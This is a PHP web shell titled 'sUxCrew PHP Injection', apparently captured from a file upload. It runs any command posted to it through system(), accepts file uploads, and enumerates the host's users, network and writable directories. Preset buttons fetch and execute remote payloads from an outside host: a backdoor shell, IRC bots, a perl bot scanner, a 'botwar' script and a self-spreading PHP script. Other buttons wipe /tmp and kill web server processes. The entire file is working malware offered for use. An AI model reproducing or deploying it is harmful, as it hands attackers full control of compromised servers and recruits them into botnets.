<title>.:: sUxCrew [Suicide] Was Here!! ::.</title>
 <body bgcolor=#000000 text=#1E90FF> <center> <br> <font face="Courier" size="5"> <b>
      Injection Succes!!
     <br>
      Faith No More - Neva Thin` U Wanna Touch Me - Kill `Em All
     </b> <br> <br> <img src="http://www.mestudios.org/themes/templates/define/shell/blue.jpg"> <br> <br> <b>
       sUxCrew PHP Injection
       <br> <b>
       Let's beat This Fuckin' System!!</font>
      </b> <hr><hr>
       <font face="Courier" style="font-size: 9pt">
        </b> </b> </font><font face="comic sans MS">
<div align="left"><b><?php
  closelog( );
  $user = get_current_user( );
  $login = posix_getuid( );
  $euid = posix_geteuid( );
  $ver = phpversion( );
  $gid = posix_getgid( );
  if ($chdir == "") $chdir = getcwd( );
  if(!$whoami)$whoami=exec("whoami");
?>
<TABLE BORDER="0" CELLPADDING="0" CELLSPACING="0">
  <TR>
  <TD align="left"><DIV STYLE="font-family: verdana; font-size: 10px;"><b>
    <span style="font-size: 9pt">Iso Di Kenthu:</b> <? if(@is_writable($chdir)){ echo "Iso"; }else{ echo "Ora"; } ?>
    </span></DIV></TD>
  </TR>  
  <TR>
  <TD align="left"><DIV STYLE="font-family: verdana; font-size: 10px;"><b>
    <span style="font-size: 9pt">Dns Server:</b> <?= "$SERVER_ADDR $SERVER_NAME"; ?>
    </span></DIV></TD>
  </TR>
</TABLE>
</b>
</div></font></div>
<?php
set_magic_quotes_runtime(0);
$currentWD  = str_replace("\\\\","\\",$_POST['_cwd']);
$currentCMD = str_replace("\\\\","\\",$_POST['_cmd']);
$UName  = `uname -a`;
$SCWD   = `pwd`;
$UserID = `id`;
if( $currentWD == "" ) {
    $currentWD = $SCWD;
}
if( $_POST['_act'] == "List!!!" ) {
    $currentCMD = "ls -la";
}
if( $_POST['_act'] == "IP" ) {
    $currentCMD = "/sbin/ifconfig|grep inet";
}
if( $_POST['_act'] == "Proc" ) {
    $currentCMD = "ps wx";
}
if( $_POST['_act'] == "Memory" ) {
    $currentCMD = "free";
}
if( $_POST['_act'] == "777" ) {
    $currentCMD = "find . -type d -perm -2 -ls";
}
if( $_POST['_act'] == "Find-id" ) {
    $currentCMD = "find . -user $currentCMD -type d";
}
if( $_POST['_act'] == "Info" ) {
    $currentCMD = "id;whoami;pwd;which wget curl w3m lynx lwp-download fetch perl gcc c++ php ftp find g++ gmake";
}
if( $_POST['_act'] == "Port" ) {
    $currentCMD = "netstat -an";
}
if( $_POST['_act'] == "Psy" ) {
    $currentCMD = "$currentCMD http://www.mestudios.org/themes/templates/define/pack/logs.tar.gz;tar -zxvf logs.tar.gz;rm -rf logs.tar.gz;cd ./logs;./config 1982";
}
if( $_POST['_act'] == "Shell" ) {
    $currentCMD = "$currentCMD http://www.mestudios.org/themes/templates/define/shell/blue.txt;mv blue.txt index4.php;chmod 755 index4.php;ls -la index4.php";
}
if( $_POST['_act'] == "Znc" ) {
    $currentCMD = "$currentCMD http://www.mestudios.org/themes/templates/define/crot;chmod 755 crot;./crot";
}
if( $_POST['_act'] == "Eggz" ) {
    $currentCMD = "$currentCMD http://www.mestudios.org/themes/templates/define/pack/eggz.tar.gz;tar -zxvf eggz.tar.gz;rm -rf eggz.tar.gz";
}
if( $_POST['_act'] == "Loader" ) {
    $currentCMD = "cd /tmp;$currentCMD http://www.mestudios.org/themes/templates/define/perl/latest.txt;perl latest.txt;rm -rf *tx*";
}
if( $_POST['_act'] == "UnrealIRCD" ) {
    $currentCMD = "$currentCMD http://www.unrealircd.com/downloads/Unreal3.2.9.tar.gz;tar -zxvf *.tar.gz;rm -rf *.tar.gz";
}
if( $_POST['_act'] == "War" ) {
    $currentCMD = "cd /tmp;$currentCMD http://www.mestudios.org/themes/templates/define/perl/grup.txt;perl grup.txt sUx.IRCsystem.net Suicide;rm -rf *.txt";
}
if( $_POST['_act'] == "Php" ) {
    $currentCMD = "cd /tmp;$currentCMD http://www.mestudios.org/themes/templates/define/php/spread.txt;php spread.txt;rm -rf *tx*";
}
if( $_POST['_act'] == "Cleaner" ) {
    $currentCMD = "cd /tmp;rm -rf *;rm -rf .*";
}
if( $_POST['_act'] == "Suicide" ) {
    $currentCMD = "pkill perl;killall -9 perl;pkill httpd;killall -9 httpd;pkill php;killall -9 php;pkill psybnc;killall -9 psybnc;pkill apache2;killall -9 apache2;pkill apache;killall -9 apache";
}
print "<form method=post enctype=\"multipart/form-data\"><hr><hr><table>";
print "<tr><td><b>Fucking Command:</b></td><td><input size=100 name=\"_cmd\" value=\"".$currentCMD."\"></td>";
print "<td><input type=submit name=_act value=\"Fucked!!!\"> <input type=submit name=_act value=\"Psy\"></td></tr>";
print "<tr><td><b>Directory:</b></td><td><input size=100 name=\"_cwd\" value=\"".$currentWD."\"></td>";
print "<td><input type=submit name=_act value=\"List!!!\"></td></tr>";
print "<tr><td><b>Upload file:</b></td><td><input size=87 type=file name=_upl></td>";
print "<td><input type=submit name=_act value=\"Upload!!!\"></td></tr>";
print "<tr><td><b>Find:</b></td>";
print "<td><input type=submit name=_act value=\"IP\"><b> <b><input type=submit name=_act value=\"Port\"><b> <b><input type=submit name=_act value=\"Proc\"><b> <b><input type=submit name=_act value=\"Memory\"><b> <b><input type=submit name=_act value=\"777\"><b> <b><input type=submit name=_act value=\"Find-id\"><b> <b><input type=submit name=_act value=\"Info\"><b> <b><input type=submit name=_act value=\"Help\"><b>";
print "<tr><td><b>Magic:</b></td>";
print "<td><input type=submit name=_act value=\"Shell\"><b> <b><input type=submit name=_act value=\"Znc\"><b>  <b><input type=submit name=_act value=\"Eggz\"><b> <b><input type=submit name=_act value=\"Loader\"><b> <b><input type=submit name=_act value=\"UnrealIRCD\"><b> <b><input type=submit name=_act value=\"War\"><b> <b><input type=submit name=_act value=\"Php\"><b> <b><input type=submit name=_act value=\"Cleaner\"><b> <b><input type=submit name=_act value=\"Suicide\"><b>";
print "</table></form><hr><hr>";
$currentCMD = str_replace("\\\"","\"",$currentCMD);
$currentCMD = str_replace("\\\'","\'",$currentCMD);
if( $_POST['_act'] == "Help" ) {
print "<table>";
print "<tr><td>Command -= Available help for this injector =-</td></tr>";
print "<tr><td>Command Fucked = To run command.</td></tr>";
print "<tr><td>Command Psy = To load psy input download support on Fucked column.</td></tr>";
print "<tr><td>Command Znc = To load znc input download support name on Fucked column.</td></tr>";
print "<tr><td>Command List = To view file on current folder.</td></tr>";
print "<tr><td>Command Upload = To upload files.</td></tr>";
print "<tr><td>Command IP = To check available IP.</td></tr>";
print "<tr><td>Command Port = To check all open ports.</td></tr>";
print "<tr><td>Command Proc = To view all process.</td></tr>";
print "<tr><td>Command Memory = To view available memory.</td></tr>";
print "<tr><td>Command 777 = To find all writable folder in current directory.</td></tr>";
print "<tr><td>Command Find-id = To find folder with current id input.</td></tr>";
print "<tr><td>Command Info = Info Server.</td></tr>";
print "<tr><td>Command Shell = To install BD,input download support on Fucked column.</td></tr>";
print "<tr><td>Command Eggz = To load eggdrop bot,inout download support on Fucked column</td></tr>";
print "<tr><td>Command Loader = To load perl botscanner,input download support on Fucked column.</td></tr>";
print "<tr><td>Command UnrealIRCD = To load UnrealIRCD input download support on Fucked column.</td></tr>";
print "<tr><td>Command War = To load perl botwar,input download support on Fucked column.</td></tr>";
print "<tr><td>Command Cleaner = To clean folder /tmp.</td></tr>";
print "<tr><td>Command Suicide = Bunuh diri,jiakakakakakkkkk......</td></tr>";
print "</table></form><hr><hr>";
}
if( $_POST['_act'] == "Upload!!!" ) {
    if( $_FILES['_upl']['error'] != UPLOAD_ERR_OK ) {
        print "<center><b>Jiamput ra iso NGACENG.....!!!</b></center>";
    } else {
        print "<center><pre>";
        system("mv ".$_FILES['_upl']['tmp_name']." ".$currentWD."/".$_FILES['_upl']['name']." 2>&1");
        print "</pre><b>Wes ndang di kenthu bos.....!!!</b></center>";
    }    
} else {
    print "\n\n<!-- Output nongol dari sini -->\n<pre>\n";
    $currentCMD = "cd ".$currentWD.";".$currentCMD;
  system("$currentCMD 1> /tmp/cmdtemp 2>&1; cat /tmp/cmdtemp; rm 
/tmp/cmdtemp");
    print "\n</pre>\n<!-- Berakhir di sini -->\n\n</center><hr><hr><center><b>Execution done!! Re-Coding by Suicide Updated 11 February 2012 [sUxCrew�] #turuk.munthuk.jare.aboh</b></center>";
}
exit;
?>
</body>
------------zeapd18zIuY8XRUc8h5yOl
Content-Disposition: form-data; name="file2"; filename=""


------------zeapd18zIuY8XRUc8h5yOl
Content-Disposition: form-data; name="file3"; filename=""


------------zeapd18zIuY8XRUc8h5yOl
Content-Disposition: form-data; name="file4"; filename=""


------------zeapd18zIuY8XRUc8h5yOl
Content-Disposition: form-data; name="file5"; filename=""


------------zeapd18zIuY8XRUc8h5yOl
Content-Disposition: form-data; name="file6"; filename=""


------------zeapd18zIuY8XRUc8h5yOl
Content-Disposition: form-data; name="file7"; filename=""


------------zeapd18zIuY8XRUc8h5yOl
Content-Disposition: form-data; name="m"

Upload
------------zeapd18zIuY8XRUc8h5yOl--